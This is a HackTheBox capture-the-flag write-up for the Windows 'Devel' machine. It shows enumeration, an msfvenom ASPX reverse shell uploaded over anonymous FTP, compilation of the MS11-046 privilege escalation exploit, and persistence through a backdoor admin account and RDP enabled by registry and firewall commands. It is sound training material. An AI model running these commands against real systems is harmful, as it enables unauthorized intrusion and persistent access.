---
title: Devel Writeup | Without Metasploit
date: 2021-09-04
categories: [WriteUp, HackTheBox]
tags: [HackTheBox, WriteUp, OSCP, TJNULLs List] 
---

---

IP : Dynamic (HTB VIP+)
OS : Windows 
Difficulty : Easy

Covered Issues : FTP, Arbitrary File Upload, Windows Priv Esc.

Tools Used : nmap, nikto, lftp, rlwrap, socat, searchsploit, i686-w64-mingw32-gcc

Remediation Advise : 
	- Disable FTP Service (or disable anonymous login)
	- Use SFTP. User better credentials.
	- Upgrade and Update to latest Windows Server OS.
	- Install all security patches.
	- Upgrade IIS Server to latest version.
	
---

#### Enumeration

- **nmap**

```sql
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 05:39 EDT
Nmap scan report for 10.129.195.182
Host is up (0.29s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.33 seconds
```

![alt](/assets/Images_P1_DEVEL/DEVEL_1.png)

-  **nikto**

```sql
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.195.182
+ Target Hostname:    10.129.195.182
+ Target Port:        80
+ Start Time:         2021-09-03 05:43:16 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 2.0.50727
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ /: Appears to be a default IIS 7 install.
+ 7915 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2021-09-03 06:58:50 (GMT-4) (4534 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

![alt](/assets/Images_P1_DEVEL/DEVEL_2.png)

----

#### Weaponizing Exploitation Tool

- Critical Information 
	- Web Server is running IIS Server.
	- from namp scan it can be observered anonymous login is accessible.
	- ftp is root directory of IIS server.
	- root directory of web server is writeable with ftp.

Creating Reverse Shell
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o prevshell.aspx
```

![alt](/assets/Images_P1_DEVEL/DEVEL_3.png)

Putting reverse shell exploit in webroot using ftp.

![alt](/assets/Images_P1_DEVEL/DEVEL_4.png)

----

#### Exploitation

Setting up socat listener.
```bash
$ rlwrap socat -d -d TCP4-LISTEN:4444,fork STDOUT
```

And accessing `prevshell.aspx` the exploit created previously with msfvenom sent into webserver root. 
It gave low level access. (server user)

![alt](/assets/Images_P1_DEVEL/DEVEL_5.png)

----

#### Privilege Escalation
- Enumeration for PrivEsc
	- whoami : webserver user
	- systeminfo : 
		- OS Name: Microsoft Windows 7 Enterprise 
		- OS Version: 6.1.7600 N/A Build 7600
		- Hotfix: N/A 

![alt](/assets/Images_P1_DEVEL/DEVEL_6.png)

It can be concluded running windows 7 was not updated with security patches.

On googling found Windows Local Privilege Escation Exploit from [ExploitDB](https://www.exploit-db.com/exploits/40564).
This is vulnerable to [CVE:2011-1249](https://nvd.nist.gov/vuln/detail/CVE-2011-1249)

![alt](/assets/Images_P1_DEVEL/DEVEL_7.png)

This exploit is also available in searchsploit DB as source code.
Compilation instructions are given in exploitDB page and in source code.

![alt](/assets/Images_P1_DEVEL/DEVEL_8.png)

> Exploit notes:
>   Privileged shell execution:
>     - the SYSTEM shell will spawn within the invoking shell/process
>   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
>     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
>   Exploit prerequisites:
>     - low privilege access to the target OS
>     - target OS not patched (KB2503665, or any other related
>       patch, if applicable, not installed - check "Related security
>       vulnerabilities/patches")
>   Exploit test notes:
>     - let the target OS boot properly (if applicable)
>     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset

Mirroring the exploit and Compiling as per instructions.

```bash
$ searchsploit afd | grep MS11-046

$ searchsploit -m windows_x86/local/40564.c

$ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

![alt](/assets/Images_P1_DEVEL/DEVEL_9.png)

Putting compiled binary into webserver root using `lftp`.

![alt](/assets/Images_P1_DEVEL/DEVEL_10.png)

Navigating PrivEsc Binary and Escalating Privileges. And gettting confirmation.

![alt](/assets/Images_P1_DEVEL/DEVEL_11.png)

----
#### Post Exploitation

- **Finding Flags**
Admin Flag / root flag
![alt](/assets/Images_P1_DEVEL/DEVEL_12.png)
User Flag
![alt](/assets/Images_P1_DEVEL/DEVEL_13.png)


- **For easier access to system we can create new admin user account.**

```sql
# net user /add [*username] [password]
net user /add akash pass

# for adding in administrators group
# net localgroup administrators [username] /add
net localgroup administrators akash /add

```

![alt](/assets/Images_P1_DEVEL/DEVEL_14.png)


- **Enabling RDP Service**

```sql
# adding registeries
> reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f

> reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f

# Enabling Terminal Service
> sc config TermService start= auto

# Starting Terminal Service
> net start Termservice

# Opening Port for RDP
> netsh.exe
> firewall
> add portopening TCP 3389 "Remote Desktop"

# Finally starting RDP and logging in with rdesktop tool.
$ rdesktop 192.168.8.92
```

![alt](/assets/Images_P1_DEVEL/DEVEL_15.png)

----